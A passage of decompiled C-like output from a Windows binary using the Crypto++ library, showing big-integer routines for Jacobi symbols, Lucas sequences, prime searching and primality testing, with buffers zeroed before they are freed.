  }
  sub_13F1135A0((__int64)v70, (__int64)v82, v4);
  sub_13F123660((__int64)v66, a2, (__int64)v82, a1);
  sub_13F112AD0((__int64)v62, 1u);
  v25 = v5 | 0xA0;
  v26 = !(unsigned int)sub_13F11C520((__int64)v66, (__int64)v62)
     || !(unsigned int)sub_13F11C520((__int64)v66, (__int64)v70);
  v27 = v25 & 0xFFFFFFDF;
  v28 = v64;
  if ( v63 < v64 )
    v28 = v63;
  v29 = (__int64)v65;
  if ( v65 )
  {
    memset(v65, 0, 8 * v28);
    sub_13F12E4D0(v29);
  }
  if ( v26 )
  {
    v30 = v68;
    if ( v67 < v68 )
      v30 = v67;
    v31 = (__int64)v69;
    if ( v69 )
    {
      memset(v69, 0, 8 * v30);
      sub_13F12E4D0(v31);
    }
    v32 = v84;
    if ( v83 < v84 )
      v32 = v83;
    v33 = (__int64)v85;
    if ( v85 )
    {
      memset(v85, 0, 8 * v32);
      sub_13F12E4D0(v33);
    }
    v34 = v72;
    if ( v71 < v72 )
      v34 = v71;
    v35 = (__int64)v73;
    if ( v73 )
    {
      memset(v73, 0, 8 * v34);
      sub_13F12E4D0(v35);
    }
    return 1;
  }
  v36 = 1;
  if ( v4 <= 1 )
  {
LABEL_85:
    v44 = v68;
    if ( v67 < v68 )
      v44 = v67;
    v45 = (__int64)v69;
    if ( v69 )
    {
      memset(v69, 0, 8 * v44);
      sub_13F12E4D0(v45);
    }
    v46 = v84;
    if ( v83 < v84 )
      v46 = v83;
    v47 = (__int64)v85;
    if ( v85 )
    {
      memset(v85, 0, 8 * v46);
      sub_13F12E4D0(v47);
    }
    v48 = v72;
    if ( v71 < v72 )
      v48 = v71;
    v49 = (__int64)v73;
    if ( v73 )
    {
      memset(v73, 0, 8 * v48);
      sub_13F12E4D0(v49);
    }
    return 0;
  }
  while ( 1 )
  {
    sub_13F1234E0((__int64)v66, (__int64)v78, (__int64)v66);
    sub_13F11FD00((__int64)v78, (__int64)v62, a1);
    v27 |= 0x600u;
    sub_13F113500((__int64)v66, (__int64)v62);
    v37 = v64;
    if ( v63 < v64 )
      v37 = v63;
    v38 = (__int64)v65;
    if ( v65 )
    {
      memset(v65, 0, 8 * v37);
      sub_13F12E4D0(v38);
    }
    v39 = v80;
    if ( v79 < v80 )
      v39 = v79;
    v40 = (__int64)v81;
    if ( v81 )
    {
      memset(v81, 0, 8 * v39);
      sub_13F12E4D0(v40);
    }
    if ( !(unsigned int)sub_13F11C520((__int64)v66, (__int64)v70) )
      break;
    sub_13F112AD0((__int64)v62, 1u);
    v41 = (unsigned int)sub_13F11C520((__int64)v66, (__int64)v62) == 0;
    v42 = v64;
    if ( v63 < v64 )
      v42 = v63;
    v43 = (__int64)v65;
    if ( v65 )
    {
      memset(v65, 0, 8 * v42);
      sub_13F12E4D0(v43);
    }
    if ( v41 )
    {
      v50 = v68;
      if ( v67 < v68 )
        v50 = v67;
      v51 = (__int64)v69;
      if ( v69 )
      {
        memset(v69, 0, 8 * v50);
        sub_13F12E4D0(v51);
      }
      v52 = v84;
      if ( v83 < v84 )
        v52 = v83;
      v53 = (__int64)v85;
      if ( v85 )
      {
        memset(v85, 0, 8 * v52);
        sub_13F12E4D0(v53);
      }
      v54 = v72;
      if ( v71 < v72 )
        v54 = v71;
      v55 = (__int64)v73;
      if ( v73 )
      {
        memset(v73, 0, 8 * v54);
        sub_13F12E4D0(v55);
      }
      return 0;
    }
    if ( ++v36 >= v4 )
      goto LABEL_85;
  }
  v56 = v68;
  if ( v67 < v68 )
    v56 = v67;
  v57 = (__int64)v69;
  if ( v69 )
  {
    memset(v69, 0, 8 * v56);
    sub_13F12E4D0(v57);
  }
  v58 = v84;
  if ( v83 < v84 )
    v58 = v83;
  v59 = (__int64)v85;
  if ( v85 )
  {
    memset(v85, 0, 8 * v58);
    sub_13F12E4D0(v59);
  }
  v60 = v72;
  if ( v71 < v72 )
    v60 = v71;
  v61 = (__int64)v73;
  if ( v73 )
  {
    memset(v73, 0, 8 * v60);
    sub_13F12E4D0(v61);
  }
  return 1;
}

//----- (000000013F1384E0) ----------------------------------------------------
__int64 __fastcall sub_13F1384E0(__int64 a1, __int64 a2)
{
  int v4; // ebx
  unsigned int v5; // esi
  unsigned int i; // edi
  __int64 v7; // rax
  unsigned __int64 v8; // rcx
  __int64 v9; // r8
  unsigned __int64 v10; // rcx
  __int64 v11; // rdx
  unsigned __int64 v12; // rcx
  __int64 v13; // rdx
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  _BYTE v17[16]; // [rsp+20h] [rbp-A8h] BYREF
  unsigned __int64 v18; // [rsp+30h] [rbp-98h]
  unsigned __int64 v19; // [rsp+38h] [rbp-90h]
  void *v20; // [rsp+40h] [rbp-88h]
  _BYTE v21[16]; // [rsp+50h] [rbp-78h] BYREF
  unsigned __int64 v22; // [rsp+60h] [rbp-68h]
  unsigned __int64 v23; // [rsp+68h] [rbp-60h]
  void *v24; // [rsp+70h] [rbp-58h]
  _BYTE v25[16]; // [rsp+80h] [rbp-48h] BYREF
  unsigned __int64 v26; // [rsp+90h] [rbp-38h]
  unsigned __int64 v27; // [rsp+98h] [rbp-30h]
  void *v28; // [rsp+A0h] [rbp-28h]
  __int64 v29; // [rsp+B0h] [rbp-18h]

  v29 = -2i64;
  sub_13F112A00((__int64)v21, a2);
  sub_13F11FD00(a1, (__int64)v17, a2);
  v4 = 1;
  v5 = 0;
  while ( !sub_13F113630((__int64)v17) )
  {
    for ( i = 0; !sub_13F11EB30((__int64)v17, i); ++i )
      ;
    sub_13F114080((__int64)v17, i);
    if ( (i & 1) != 0 && (sub_13F11FDF0((__int64)v21, 8ui64) == 3 || sub_13F11FDF0((__int64)v21, 8ui64) == 5) )
      v4 = -v4;
    if ( sub_13F11FDF0((__int64)v17, 4ui64) == 3 && sub_13F11FDF0((__int64)v21, 4ui64) == 3 )
      v4 = -v4;
    sub_13F1238F0((__int64)v17, (__int64)v21);
    v7 = sub_13F11FD00((__int64)v17, (__int64)v25, (__int64)v21);
    sub_13F113500((__int64)v17, v7);
    v8 = v27;
    if ( v26 < v27 )
      v8 = v26;
    v9 = (__int64)v28;
    if ( v28 )
    {
      memset(v28, 0, 8 * v8);
      sub_13F12E4D0(v9);
    }
  }
  sub_13F112AD0((__int64)v25, 1u);
  if ( !(unsigned int)sub_13F11C520((__int64)v21, (__int64)v25) )
    v5 = v4;
  v10 = v27;
  if ( v26 < v27 )
    v10 = v26;
  v11 = (__int64)v28;
  if ( v28 )
  {
    memset(v28, 0, 8 * v10);
    sub_13F12E4D0(v11);
  }
  v12 = v19;
  if ( v18 < v19 )
    v12 = v18;
  v13 = (__int64)v20;
  if ( v20 )
  {
    memset(v20, 0, 8 * v12);
    sub_13F12E4D0(v13);
  }
  v14 = v23;
  if ( v22 < v23 )
    v14 = v22;
  v15 = (__int64)v24;
  if ( v24 )
  {
    memset(v24, 0, 8 * v14);
    sub_13F12E4D0(v15);
  }
  return v5;
}

//----- (000000013F1386E0) ----------------------------------------------------
__int64 __fastcall sub_13F1386E0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v8; // ebx
  __int64 (__fastcall *(**v9)[4])(); // rax
  unsigned __int64 v10; // rcx
  __int64 v11; // rdx
  __int64 (__fastcall *(**v12)[4])(); // rax
  __int64 v13; // rax
  __int64 v14; // rax
  unsigned int v15; // ebx
  __int64 v16; // rdi
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  char *v21; // rcx
  __int64 v22; // rax
  __int64 v23; // rax
  __int64 v24; // rax
  unsigned __int64 v25; // rcx
  __int64 v26; // rdx
  unsigned __int64 v27; // rcx
  __int64 v28; // rdx
  unsigned __int64 v29; // rcx
  __int64 v30; // rdx
  unsigned __int64 v31; // rcx
  __int64 v32; // rdx
  char v34[16]; // [rsp+30h] [rbp-D8h] BYREF
  unsigned __int64 v35; // [rsp+40h] [rbp-C8h]
  unsigned __int64 v36; // [rsp+48h] [rbp-C0h]
  void *v37; // [rsp+50h] [rbp-B8h]
  char v38[16]; // [rsp+60h] [rbp-A8h] BYREF
  unsigned __int64 v39; // [rsp+70h] [rbp-98h]
  unsigned __int64 v40; // [rsp+78h] [rbp-90h]
  void *v41; // [rsp+80h] [rbp-88h]
  char v42[16]; // [rsp+90h] [rbp-78h] BYREF
  unsigned __int64 v43; // [rsp+A0h] [rbp-68h]
  unsigned __int64 v44; // [rsp+A8h] [rbp-60h]
  void *v45; // [rsp+B0h] [rbp-58h]
  char v46[16]; // [rsp+C0h] [rbp-48h] BYREF
  unsigned __int64 v47; // [rsp+D0h] [rbp-38h]
  unsigned __int64 v48; // [rsp+D8h] [rbp-30h]
  void *v49; // [rsp+E0h] [rbp-28h]
  __int64 v50; // [rsp+F0h] [rbp-18h]
  char v51[16]; // [rsp+F8h] [rbp-10h] BYREF
  unsigned __int64 v52; // [rsp+108h] [rbp+0h]
  unsigned __int64 v53; // [rsp+110h] [rbp+8h]
  void *v54; // [rsp+118h] [rbp+10h]
  __int64 v55[32]; // [rsp+128h] [rbp+20h] BYREF

  v50 = -2i64;
  v8 = sub_13F11BFE0(a2);
  if ( v8 )
  {
    sub_13F112F30((__int64)v55, a4);
    sub_13F11FD00(a3, (__int64)v51, a4);
    sub_13F11C590((__int64)v55, (__int64)v42, (__int64)v51);
    v10 = v53;
    if ( v52 < v53 )
      v10 = v52;
    v11 = (__int64)v54;
    if ( v54 )
    {
      memset(v54, 0, 8 * v10);
      sub_13F12E4D0(v11);
    }
    v12 = sub_13F123540();
    sub_13F11C590((__int64)v55, (__int64)v46, (__int64)v12);
    sub_13F112A00((__int64)v34, (__int64)v42);
    v13 = sub_13F122910((__int64)v55, (__int64)v42);
    v14 = sub_13F123320((__int64)v55, v13, (__int64)v46);
    sub_13F112A00((__int64)v38, v14);
    v15 = v8 - 1;
    if ( v15 )
    {
      v16 = v15;
      do
      {
        --v15;
        if ( sub_13F11EB30(a2, --v16) )
        {
          v17 = sub_13F1209F0((__int64)v55, (__int64)v34, (__int64)v38);
          v18 = sub_13F123320((__int64)v55, v17, (__int64)v42);
          sub_13F113500((__int64)v34, v18);
          v19 = sub_13F122910((__int64)v55, (__int64)v38);
          v20 = sub_13F123320((__int64)v55, v19, (__int64)v46);
          v21 = v38;
        }
        else
        {
          v22 = sub_13F1209F0((__int64)v55, (__int64)v34, (__int64)v38);
          v23 = sub_13F123320((__int64)v55, v22, (__int64)v42);
          sub_13F113500((__int64)v38, v23);
          v24 = sub_13F122910((__int64)v55, (__int64)v34);
          v20 = sub_13F123320((__int64)v55, v24, (__int64)v46);
          v21 = v34;
        }
        sub_13F113500((__int64)v21, v20);
      }
      while ( v15 );
    }
    sub_13F11C6B0((__int64)v55, a1, (__int64)v34);
    v25 = v40;
    if ( v39 < v40 )
      v25 = v39;
    v26 = (__int64)v41;
    if ( v41 )
    {
      memset(v41, 0, 8 * v25);
      sub_13F12E4D0(v26);
    }
    v27 = v36;
    if ( v35 < v36 )
      v27 = v35;
    v28 = (__int64)v37;
    if ( v37 )
    {
      memset(v37, 0, 8 * v27);
      sub_13F12E4D0(v28);
    }
    v29 = v48;
    if ( v47 < v48 )
      v29 = v47;
    v30 = (__int64)v49;
    if ( v49 )
    {
      memset(v49, 0, 8 * v29);
      sub_13F12E4D0(v30);
    }
    v31 = v44;
    if ( v43 < v44 )
      v31 = v43;
    v32 = (__int64)v45;
    if ( v45 )
    {
      memset(v45, 0, 8 * v31);
      sub_13F12E4D0(v32);
    }
    sub_13F113450(v55);
  }
  else
  {
    v9 = sub_13F123540();
    sub_13F112A00(a1, (__int64)v9);
  }
  return a1;
}
// 13F1386E0: using guessed type _QWORD var_110[32];

//----- (000000013F1389B0) ----------------------------------------------------
__int64 __fastcall sub_13F1389B0(__int64 a1, unsigned int a2)
{
  unsigned __int64 v2; // rbx
  __int64 v4; // rdx
  __int64 v5; // rcx
  __int64 v6; // rax
  __int64 v7; // rsi
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  unsigned __int64 v10; // rcx
  __int64 v11; // rdx
  unsigned __int64 v12; // rcx
  __int64 v13; // rdx
  __int64 v14; // rax
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  unsigned __int64 v19; // rcx
  __int64 v20; // rdx
  __int64 v21; // rax
  unsigned __int64 v22; // rcx
  __int64 v23; // rdx
  __int64 v24; // rax
  __int64 v25; // rcx
  __int64 v26; // rax
  __int64 v27; // rbx
  unsigned __int64 v28; // rcx
  __int64 v29; // rdx
  unsigned __int64 v30; // rcx
  __int64 v31; // rdx
  unsigned __int64 v32; // rcx
  __int64 v33; // rdx
  __int64 v34; // rsi
  __int64 v35; // rax
  __int64 v36; // rdi
  __int64 v37; // r12
  void (__fastcall ***v38)(_QWORD, __int64); // rcx
  void (__fastcall ***v39)(_QWORD, __int64); // rcx
  __int64 v40; // rdi
  __int64 v41; // rax
  __int64 v42; // rax
  unsigned __int64 v43; // rcx
  __int64 v44; // rdx
  unsigned __int64 v45; // rcx
  __int64 v46; // rdx
  void **v48; // [rsp+30h] [rbp-D0h] BYREF
  void (__fastcall ***v49)(_QWORD, __int64); // [rsp+38h] [rbp-C8h]
  unsigned __int64 v50; // [rsp+40h] [rbp-C0h]
  unsigned __int64 v51; // [rsp+48h] [rbp-B8h]
  void *v52; // [rsp+50h] [rbp-B0h]
  char v53[16]; // [rsp+60h] [rbp-A0h] BYREF
  unsigned __int64 v54; // [rsp+70h] [rbp-90h]
  unsigned __int64 v55; // [rsp+78h] [rbp-88h]
  void *v56; // [rsp+80h] [rbp-80h]
  char v57[16]; // [rsp+90h] [rbp-70h] BYREF
  unsigned __int64 v58; // [rsp+A0h] [rbp-60h]
  unsigned __int64 v59; // [rsp+A8h] [rbp-58h]
  void *v60; // [rsp+B0h] [rbp-50h]
  __int64 v61; // [rsp+C0h] [rbp-40h]
  __int64 v62; // [rsp+C8h] [rbp-38h]
  __m128i v63; // [rsp+D0h] [rbp-30h] BYREF
  unsigned __int64 v64; // [rsp+E0h] [rbp-20h]
  unsigned __int64 v65; // [rsp+E8h] [rbp-18h]
  void *v66; // [rsp+F0h] [rbp-10h]
  char pExceptionObject[16]; // [rsp+100h] [rbp+0h] BYREF
  unsigned __int64 v68; // [rsp+110h] [rbp+10h]
  unsigned __int64 v69; // [rsp+118h] [rbp+18h]
  void *v70; // [rsp+120h] [rbp+20h]

  v61 = -2i64;
  v2 = a2;
  v62 = a1;
  if ( a2 < 0x10 )
  {
    sub_13F1053B0(&v63, (const __m128i *)"invalid bit length");
    sub_13F101600((__int64)pExceptionObject, &v63);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_13F112CF0((__int64)v57);
  sub_13F112CF0((__int64)v53);
  if ( (v2 & 1) != 0 )
  {
    v21 = sub_13F1215D0((__int64)pExceptionObject, (unsigned __int64)(unsigned int)(v2 - 1) >> 1);
    sub_13F113500((__int64)v57, v21);
    v22 = v69;
    if ( v68 < v69 )
      v22 = v68;
    v23 = (__int64)v70;
    if ( v70 )
    {
      memset(v70, 0, 8 * v22);
      sub_13F12E4D0(v23);
    }
    v24 = sub_13F112AD0((__int64)&v48, 0xB5u);
    v25 = sub_13F112A00((__int64)pExceptionObject, v24);
    v26 = sub_13F114170(v25, ((unsigned int)(v2 + 1) >> 1) - 8);
    v27 = sub_13F112A00((__int64)&v63, v26);
    v28 = v69;
    if ( v68 < v69 )
      v28 = v68;
    v29 = (__int64)v70;
    if ( v70 )
    {
      memset(v70, 0, 8 * v28);
      sub_13F12E4D0(v29);
    }
    sub_13F113500((__int64)v53, v27);
    v30 = v65;
    if ( v64 < v65 )
      v30 = v64;
    v31 = (__int64)v66;
    if ( v66 )
    {
      memset(v66, 0, 8 * v30);
      sub_13F12E4D0(v31);
    }
    v32 = v51;
    if ( v50 < v51 )
      v32 = v50;
    v33 = (__int64)v52;
    if ( v52 )
    {
      memset(v52, 0, 8 * v32);
      sub_13F12E4D0(v33);
    }
  }
  else
  {
    v4 = sub_13F112AD0((__int64)pExceptionObject, 0xB6u);
    v5 = sub_13F112A00((__int64)&v63, v4);
    v6 = sub_13F114170(v5, ((unsigned int)v2 >> 1) - 8);
    v7 = sub_13F112A00((__int64)&v48, v6);
    v8 = v65;
    if ( v64 < v65 )
      v8 = v64;
    v9 = (__int64)v66;
    if ( v66 )
    {
      memset(v66, 0, 8 * v8);
      sub_13F12E4D0(v9);
    }
    sub_13F113500((__int64)v57, v7);
    v10 = v51;
    if ( v50 < v51 )
      v10 = v50;
    v11 = (__int64)v52;
    if ( v52 )
    {
      memset(v52, 0, 8 * v10);
      sub_13F12E4D0(v11);
    }
    v12 = v69;
    if ( v68 < v69 )
      v12 = v68;
    v13 = (__int64)v70;
    if ( v70 )
    {
      memset(v70, 0, 8 * v12);
      sub_13F12E4D0(v13);
    }
    sub_13F112AD0((__int64)&v48, 1u);
    v14 = sub_13F1215D0((__int64)pExceptionObject, v2 >> 1);
    sub_13F11FBB0(v14, (__int64)&v63, (__int64)&v48);
    sub_13F113500((__int64)v53, (__int64)&v63);
    v15 = v65;
    if ( v64 < v65 )
      v15 = v64;
    v16 = (__int64)v66;
    if ( v66 )
    {
      memset(v66, 0, 8 * v15);
      sub_13F12E4D0(v16);
    }
    v17 = v69;
    if ( v68 < v69 )
      v17 = v68;
    v18 = (__int64)v70;
    if ( v70 )
    {
      memset(v70, 0, 8 * v17);
      sub_13F12E4D0(v18);
    }
    v19 = v51;
    if ( v50 < v51 )
      v19 = v50;
    v20 = (__int64)v52;
    if ( v52 )
    {
      memset(v52, 0, 8 * v19);
      sub_13F12E4D0(v20);
    }
  }
  v34 = sub_13F12AA90((__int64)&v48);
  v35 = sub_13F14059C(40i64);
  v36 = v35;
  if ( v35 )
  {
    *(_QWORD *)(v35 + 8) = "RandomNumberType";
    *(_WORD *)(v35 + 16) = 1;
    *(_QWORD *)(v35 + 24) = 0i64;
    *(_QWORD *)v35 = off_13F185AB8;
    *(_DWORD *)(v35 + 32) = 1;
  }
  else
  {
    v36 = 0i64;
  }
  v37 = *(_QWORD *)(v34 + 8);
  *(_QWORD *)(v34 + 8) = 0i64;
  v38 = *(void (__fastcall ****)(_QWORD, __int64))(v36 + 24);
  if ( v38 )
    (**v38)(v38, 1i64);
  *(_QWORD *)(v36 + 24) = v37;
  v39 = *(void (__fastcall ****)(_QWORD, __int64))(v34 + 8);
  if ( v39 )
    (**v39)(v39, 1i64);
  *(_QWORD *)(v34 + 8) = v36;
  *(_BYTE *)(v34 + 16) = 1;
  v40 = sub_13F12AA30((__int64)&v63, v34);
  if ( v49 )
    (**v49)(v49, 1i64);
  v48 = &CryptoPP::NameValuePairs::`vftable';
  v41 = sub_13F1361E0(v40, (__int64)"Min", (__int64)v57);
  v42 = sub_13F1361E0(v41, (__int64)"Max", (__int64)v53);
  sub_13F12AA30(a1, v42);
  if ( v63.m128i_i64[1] )
    (**(void (__fastcall ***)(__int64, __int64))v63.m128i_i64[1])(v63.m128i_i64[1], 1i64);
  v63.m128i_i64[0] = (__int64)&CryptoPP::NameValuePairs::`vftable';
  v43 = v55;
  if ( v54 < v55 )
    v43 = v54;
  v44 = (__int64)v56;
  if ( v56 )
  {
    memset(v56, 0, 8 * v43);
    sub_13F12E4D0(v44);
  }
  v45 = v59;
  if ( v58 < v59 )
    v45 = v58;
  v46 = (__int64)v60;
  if ( v60 )
  {
    memset(v60, 0, 8 * v45);
    sub_13F12E4D0(v46);
  }
  return a1;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F185AB8: using guessed type __int64 (__fastcall *off_13F185AB8[3])();

//----- (000000013F138E90) ----------------------------------------------------
__int64 __fastcall sub_13F138E90(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7)
{
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  char v20[16]; // [rsp+48h] [rbp-91h] BYREF
  unsigned __int64 v21; // [rsp+58h] [rbp-81h]
  unsigned __int64 v22; // [rsp+60h] [rbp-79h]
  void *v23; // [rsp+68h] [rbp-71h]
  char v24[16]; // [rsp+78h] [rbp-61h] BYREF
  unsigned __int64 v25; // [rsp+88h] [rbp-51h]
  unsigned __int64 v26; // [rsp+90h] [rbp-49h]
  void *v27; // [rsp+98h] [rbp-41h]
  char v28[16]; // [rsp+A8h] [rbp-31h] BYREF
  unsigned __int64 v29; // [rsp+B8h] [rbp-21h]
  unsigned __int64 v30; // [rsp+C0h] [rbp-19h]
  void *v31; // [rsp+C8h] [rbp-11h]
  char v32[16]; // [rsp+D8h] [rbp-1h] BYREF
  unsigned __int64 v33; // [rsp+E8h] [rbp+Fh]
  unsigned __int64 v34; // [rsp+F0h] [rbp+17h]
  void *v35; // [rsp+F8h] [rbp+1Fh]

  sub_13F11FD00(a2, (__int64)v20, a5);
  sub_13F123660((__int64)v32, (__int64)v20, a3, a5);
  v11 = v22;
  if ( v21 < v22 )
    v11 = v21;
  v12 = (__int64)v23;
  if ( v23 )
  {
    memset(v23, 0, 8 * v11);
    sub_13F12E4D0(v12);
  }
  sub_13F11FD00(a2, (__int64)v24, a6);
  sub_13F123660((__int64)v28, (__int64)v24, a4, a6);
  v13 = v26;
  if ( v25 < v26 )
    v13 = v25;
  v14 = (__int64)v27;
  if ( v27 )
  {
    memset(v27, 0, 8 * v13);
    sub_13F12E4D0(v14);
  }
  sub_13F136920(a1, (__int64)v32, a5, (__int64)v28, a6, a7);
  v15 = v30;
  if ( v29 < v30 )
    v15 = v29;
  v16 = (__int64)v31;
  if ( v31 )
  {
    memset(v31, 0, 8 * v15);
    sub_13F12E4D0(v16);
  }
  v17 = v34;
  if ( v33 < v34 )
    v17 = v33;
  v18 = (__int64)v35;
  if ( v35 )
  {
    memset(v35, 0, 8 * v17);
    sub_13F12E4D0(v18);
  }
  return a1;
}

//----- (000000013F139030) ----------------------------------------------------
char __fastcall sub_13F139030(_QWORD *a1, __int64 a2)
{
  __int64 v4; // r9
  __int64 v5; // rdi
  __int64 v6; // r8
  __int64 v7; // rdi
  __int64 v8; // rdx
  unsigned __int64 v9; // rcx
  _DWORD *v10; // rax
  unsigned __int64 v11; // rax
  __int64 v12; // rcx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  unsigned __int64 v18; // rcx
  __int64 v19; // rdx
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  unsigned __int64 v22; // rcx
  __int64 v23; // rdx
  __int128 v24; // [rsp+28h] [rbp-69h]
  char v25[16]; // [rsp+38h] [rbp-59h] BYREF
  unsigned __int64 v26; // [rsp+48h] [rbp-49h]
  unsigned __int64 v27; // [rsp+50h] [rbp-41h]
  void *v28; // [rsp+58h] [rbp-39h]
  char v29[16]; // [rsp+68h] [rbp-29h] BYREF
  unsigned __int64 v30; // [rsp+78h] [rbp-19h]
  unsigned __int64 v31; // [rsp+80h] [rbp-11h]
  void *v32; // [rsp+88h] [rbp-9h]
  __int128 v33; // [rsp+98h] [rbp+7h]
  __int64 v34; // [rsp+A8h] [rbp+17h]
  char v35[16]; // [rsp+B0h] [rbp+1Fh] BYREF
  unsigned __int64 v36; // [rsp+C0h] [rbp+2Fh]
  unsigned __int64 v37; // [rsp+C8h] [rbp+37h]
  void *v38; // [rsp+D0h] [rbp+3Fh]

  v34 = -2i64;
  while ( 1 )
  {
    v4 = a1[20];
    v5 = a1[23];
    v6 = v5 >= 0 ? v4 + 4 * ((unsigned __int64)v5 >> 5) : v4 - (4 * ((unsigned __int64)~v5 >> 5) + 4);
    v7 = a1[23] & 0x1Fi64;
    v8 = a1[19];
    *(_QWORD *)&v24 = v8 >= 0 ? v4 + 4 * ((unsigned __int64)v8 >> 5) : v4 - (4 * ((unsigned __int64)~v8 >> 5) + 4);
    *((_QWORD *)&v24 + 1) = a1[19] & 0x1Fi64;
    v33 = v24;
    v9 = *((_QWORD *)&v24 + 1);
    v10 = (_DWORD *)v24;
    while ( (v10 != (_DWORD *)v6 || v9 != v7) && ((1 << v9) & *v10) != 0 )
    {
      if ( v9 >= 0x1F )
      {
        v9 = 0i64;
        ++v10;
      }
      else
      {
        ++v9;
      }
    }
    v11 = v9 + 32 * (((__int64)v10 - v4) >> 2);
    a1[19] = v11;
    v12 = a1[23];
    if ( v11 != v12 )
      break;
    sub_13F112AD0((__int64)v29, v12);
    sub_13F1234E0((__int64)v29, (__int64)v25, (__int64)(a1 + 12));
    sub_13F113F60((__int64)a1, (__int64)v25);
    v13 = v27;
    if ( v26 < v27 )
      v13 = v26;
    v14 = (__int64)v28;
    if ( v28 )
    {
      memset(v28, 0, 8 * v13);
      sub_13F12E4D0(v14);
    }
    v15 = v31;
    if ( v30 < v31 )
      v15 = v30;
    v16 = (__int64)v32;
    if ( v32 )
    {
      memset(v32, 0, 8 * v15);
      sub_13F12E4D0(v16);
    }
    if ( (int)sub_13F11C520((__int64)a1, (__int64)(a1 + 6)) > 0 )
      return 0;
    a1[19] = 0i64;
    sub_13F136A90((__int64)a1);
  }
  sub_13F112AD0((__int64)v35, v11);
  sub_13F1234E0((__int64)v35, (__int64)v25, (__int64)(a1 + 12));
  sub_13F120ED0((__int64)a1, (__int64)v29, (__int64)v25);
  sub_13F113500(a2, (__int64)v29);
  v18 = v31;
  if ( v30 < v31 )
    v18 = v30;
  v19 = (__int64)v32;
  if ( v32 )
  {
    memset(v32, 0, 8 * v18);
    sub_13F12E4D0(v19);
  }
  v20 = v27;
  if ( v26 < v27 )
    v20 = v26;
  v21 = (__int64)v28;
  if ( v28 )
  {
    memset(v28, 0, 8 * v20);
    sub_13F12E4D0(v21);
  }
  v22 = v37;
  if ( v36 < v37 )
    v22 = v36;
  v23 = (__int64)v38;
  if ( v38 )
  {
    memset(v38, 0, 8 * v22);
    sub_13F12E4D0(v23);
  }
  ++a1[19];
  return 1;
}
// 13F139079: conditional instruction was optimized away because rdi.8<0
// 13F1390B5: conditional instruction was optimized away because rdx.8<0

//----- (000000013F1392E0) ----------------------------------------------------
bool __fastcall sub_13F1392E0(__int64 a1, __int64 a2, unsigned int a3)
{
  int v6; // er15
  bool v7; // bl
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  char v10; // di
  bool v11; // bl
  unsigned __int64 v12; // rcx
  __int64 v13; // rdx
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  int v17; // ebx
  unsigned __int64 v18; // rcx
  __int64 v19; // rdx
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  unsigned __int64 v22; // rcx
  __int64 v23; // rdx
  unsigned __int64 v24; // rcx
  __int64 v25; // rdx
  unsigned __int64 v26; // rcx
  __int64 v27; // rdx
  char v28[16]; // [rsp+28h] [rbp-99h] BYREF
  unsigned __int64 v29; // [rsp+38h] [rbp-89h]
  unsigned __int64 v30; // [rsp+40h] [rbp-81h]
  void *v31; // [rsp+48h] [rbp-79h]
  char v32[16]; // [rsp+58h] [rbp-69h] BYREF
  unsigned __int64 v33; // [rsp+68h] [rbp-59h]
  unsigned __int64 v34; // [rsp+70h] [rbp-51h]
  void *v35; // [rsp+78h] [rbp-49h]
  char v36[16]; // [rsp+88h] [rbp-39h] BYREF
  unsigned __int64 v37; // [rsp+98h] [rbp-29h]
  unsigned __int64 v38; // [rsp+A0h] [rbp-21h]
  void *v39; // [rsp+A8h] [rbp-19h]
  __int64 v40; // [rsp+B8h] [rbp-9h]
  char v41[16]; // [rsp+C0h] [rbp-1h] BYREF
  unsigned __int64 v42; // [rsp+D0h] [rbp+Fh]
  unsigned __int64 v43; // [rsp+D8h] [rbp+17h]
  void *v44; // [rsp+E0h] [rbp+1Fh]

  v40 = -2i64;
  v6 = 0;
  sub_13F112AD0((__int64)v28, 3u);
  v7 = (int)sub_13F11C520(a2, (__int64)v28) <= 0;
  v8 = v30;
  if ( v29 < v30 )
    v8 = v29;
  v9 = (__int64)v31;
  if ( v31 )
  {
    memset(v31, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  if ( v7 )
  {
    sub_13F112AD0((__int64)v32, 2u);
    v10 = 1;
    v11 = 1;
    if ( (unsigned int)sub_13F11C520(a2, (__int64)v32) )
    {
      sub_13F112AD0((__int64)v28, 3u);
      v10 = 3;
      if ( (unsigned int)sub_13F11C520(a2, (__int64)v28) )
        v11 = 0;
    }
    if ( (v10 & 2) != 0 )
    {
      v12 = v30;
      if ( v29 < v30 )
        v12 = v29;
      v13 = (__int64)v31;
      if ( v31 )
      {
        memset(v31, 0, 8 * v12);
        sub_13F12E4D0(v13);
      }
    }
    v14 = v34;
    if ( v33 < v34 )
      v14 = v33;
    v15 = (__int64)v35;
    if ( v35 )
    {
      memset(v35, 0, 8 * v14);
      sub_13F12E4D0(v15);
    }
    return v11;
  }
  else
  {
    sub_13F112CF0((__int64)v36);
    v17 = 0;
    if ( a3 )
    {
      while ( 1 )
      {
        sub_13F112AD0((__int64)v41, 2u);
        sub_13F112AD0((__int64)v28, 2u);
        sub_13F11FBB0(a2, (__int64)v32, (__int64)v41);
        v6 |= 4u;
        sub_13F121660((__int64)v36, a1, (__int64)v28, (__int64)v32);
        v18 = v34;
        if ( v33 < v34 )
          v18 = v33;
        v19 = (__int64)v35;
        if ( v35 )
        {
          memset(v35, 0, 8 * v18);
          sub_13F12E4D0(v19);
        }
        v20 = v30;
        if ( v29 < v30 )
          v20 = v29;
        v21 = (__int64)v31;
